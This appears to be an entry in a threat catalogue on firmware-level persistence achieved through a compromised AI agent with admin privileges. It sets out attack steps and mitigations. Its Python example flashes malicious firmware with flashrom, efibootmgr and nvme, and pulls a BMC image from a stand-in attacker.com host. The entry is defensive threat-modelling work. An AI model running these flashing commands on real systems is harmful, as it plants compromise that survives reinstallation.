---
id: "TS-2026-0093"
title: "Firmware-Level Persistence via Agent System Access"
category: "P5"
severity: "Critical"
description: "An attacker uses a compromised agent with system-level privileges to flash malicious firmware to UEFI/BIOS, NIC, SSD, or BMC, establishing persistence that survives OS reinstallation, disk replacement, and standard forensics."
date: "2026-02-26"
tags: ["persistence", "firmware", "uefi", "bios", "bootkit", "advanced-persistent-threat"]
---

## Overview

Firmware — the code embedded in hardware components — executes before the operating system loads and persists across OS reinstallation, disk formatting, and even disk replacement (for non-disk firmware). An agent with system administration privileges can write malicious firmware to UEFI/BIOS chips, network interface cards, SSDs, or baseboard management controllers (BMCs). This creates the most persistent form of compromise: the malware survives every remediation step short of physical hardware replacement or reflashing.

## Attack Vector

1. Agent has system administration privileges (common for IT automation, deployment, patch management agents)
2. Attacker compromises agent and identifies flashable firmware targets on the host
3. Agent uses legitimate firmware update tools (fwupd, vendor utilities) to flash malicious firmware
4. Malicious firmware establishes pre-boot persistence — runs before OS, before antivirus, before EDR
5. On each boot, firmware re-infects the OS if malware is removed
6. BMC/IPMI firmware provides out-of-band access even when host is powered off

## Impact

- **Unremovable persistence** — survives OS reinstall, disk wipe, disk replacement (for NIC/BMC firmware)
- **Pre-boot execution** — runs before any security software loads
- **Detection evasion** — firmware not scanned by standard antivirus/EDR
- **Supply chain amplification** — compromised agent in IT department can firmware-infect entire fleet
- **Physical access equivalent** — remote firmware write achieves what previously required physical access

## Example

```python
import subprocess
import os
import struct

class FirmwarePersistence:
    """
    Demonstrates firmware-level persistence techniques
    accessible to an agent with system privileges.
    """
    
    def enumerate_firmware_targets(self) -> dict:
        """Identify flashable firmware components on the host."""
        targets = {}
        
        # UEFI firmware via fwupd (Linux)
        try:
            result = subprocess.run(
                ["fwupdmgr", "get-devices", "--json"],
                capture_output=True, text=True
            )
            targets["uefi_devices"] = result.stdout
        except FileNotFoundError:
            pass
        
        # SSD firmware
        try:
            result = subprocess.run(
                ["smartctl", "-i", "/dev/sda"],
                capture_output=True, text=True
            )
            targets["ssd_firmware"] = result.stdout
        except FileNotFoundError:
            pass
        
        # BMC/IPMI (server environments)
        try:
            result = subprocess.run(
                ["ipmitool", "mc", "info"],
                capture_output=True, text=True
            )
            targets["bmc"] = result.stdout
        except FileNotFoundError:
            pass
        
        # Network interface card firmware
        try:
            result = subprocess.run(
                ["ethtool", "-i", "eth0"],
                capture_output=True, text=True
            )
            targets["nic_firmware"] = result.stdout
        except FileNotFoundError:
            pass
        
        return targets
    
    def flash_uefi_persistence(self, malicious_efi_path: str):
        """
        Write a malicious UEFI module that re-infects the OS on boot.
        Uses the legitimate fwupd framework to appear as a normal update.
        """
        # Create a firmware capsule containing the malicious module
        # The module hooks ExitBootServices to inject into OS loader
        
        # Method 1: Add EFI boot entry (simpler, less stealthy)
        subprocess.run([
            "efibootmgr", "--create",
            "--disk", "/dev/sda",
            "--part", "1",
            "--loader", "\\EFI\\maintenance\\update.efi",
            "--label", "System Maintenance",
        ], check=True)
        
        # Method 2: Modify existing UEFI firmware via SPI flash (advanced)
        # Requires raw SPI access — possible via /dev/mem or flashrom
        subprocess.run([
            "flashrom", "-p", "internal",
            "-w", malicious_efi_path,
            "--ifd", "-i", "bios",
        ], check=True)
    
    def flash_bmc_backdoor(self, bmc_ip: str, credentials: dict):
        """
        Flash malicious BMC firmware for out-of-band persistence.
        BMC runs independently — accessible even when host is off.
        """
        import requests
        
        # Upload malicious firmware via BMC web interface (Redfish API)
        with open("malicious_bmc_firmware.bin", "rb") as f:
            response = requests.post(
                f"https://{bmc_ip}/redfish/v1/UpdateService/Actions/SimpleUpdate",
                auth=(credentials["user"], credentials["pass"]),
                json={
                    "ImageURI": "https://attacker.com/firmware/bmc_update.bin",
                    "TransferProtocol": "HTTPS",
                    "Targets": ["/redfish/v1/Managers/1"],
                },
                verify=False
            )
        
        return response.status_code
    
    def ssd_firmware_persistence(self):
        """
        Compromise SSD firmware to hide data and survive disk 'wiping'.
        Malicious SSD firmware can:
        - Hide sectors from the OS (invisible storage)
        - Intercept and modify reads (rootkit)
        - Survive TRIM and secure erase commands
        """
        # Vendor-specific: NVMe firmware update via ioctl
        # This is highly hardware-dependent
        subprocess.run([
            "nvme", "fw-download", "/dev/nvme0",
            "--fw=malicious_ssd_firmware.bin",
        ], check=True)
        
        subprocess.run([
            "nvme", "fw-activate", "/dev/nvme0",
            "--slot=1", "--action=1",
        ], check=True)
```

## Mitigation

- Agents should never have firmware write access — even admin agents should operate in a restricted namespace
- Enable UEFI Secure Boot with custom key enrollment to prevent unauthorized firmware
- Use TPM-based measured boot to detect firmware modifications
- Hardware-based firmware write protection (SPI flash write-protect jumpers)
- BMC access should require physical presence or hardware token, never agent-accessible credentials
- Regular firmware integrity verification against vendor-signed known-good images
- Implement firmware allowlisting — only vendor-signed firmware updates accepted

## Real-World Examples

- **LoJax UEFI Rootkit (2018)** — First in-the-wild UEFI rootkit discovered by ESET, attributed to APT28 (Fancy Bear). LoJax modified the SPI flash firmware to survive OS reinstallation and disk replacement. [ESET Research](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild/)
- **MosaicRegressor UEFI Bootkit (2020)** — Kaspersky discovered a UEFI firmware implant used in targeted attacks, delivered through a modified firmware update tool. [Kaspersky](https://securelist.com/mosaicregressor/98849/)
- **CosmicStrand UEFI Firmware Rootkit (2022)** — Kaspersky identified another UEFI rootkit persisting in firmware of ASUS and Gigabyte motherboards, surviving multiple OS reinstalls. [Kaspersky](https://securelist.com/cosmicstrand-uefi-firmware-rootkit/106973/)

- See also: [TS-2026-0094](/skill/TS-2026-0094), [TS-2026-0059](/skill/TS-2026-0059), [TS-2026-0042](/skill/TS-2026-0042)
